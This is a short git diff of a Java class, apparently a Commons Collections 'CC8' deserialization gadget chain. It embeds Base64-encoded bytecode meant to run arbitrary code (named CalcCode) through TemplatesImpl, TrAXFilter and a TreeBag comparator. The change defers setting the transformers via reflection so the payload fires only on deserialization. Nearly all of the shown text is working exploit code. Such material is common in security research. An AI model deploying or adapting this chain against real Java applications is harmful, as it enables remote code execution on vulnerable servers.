@@ -27,6 +27,7 @@ public class CC8 {
     }
 
     public static void main(String[] args) throws Exception{
+        ChainedTransformer transformerChain = new ChainedTransformer(new ConstantTransformer("3xsh0re"));
         byte[] CalcCode = Base64.getDecoder().decode(
                 "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEA" +
                         "CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP" +
@@ -52,9 +53,9 @@ public class CC8 {
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{calcTemp})
         };
-        ChainedTransformer transformerChain = new ChainedTransformer(transformers);
         TreeBag treeBag = new TreeBag<>(new TransformingComparator(transformerChain));
         treeBag.add("3xsh0re");
+        setFieldValue(transformerChain,"iTransformers",transformers);
 
         // 测试
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
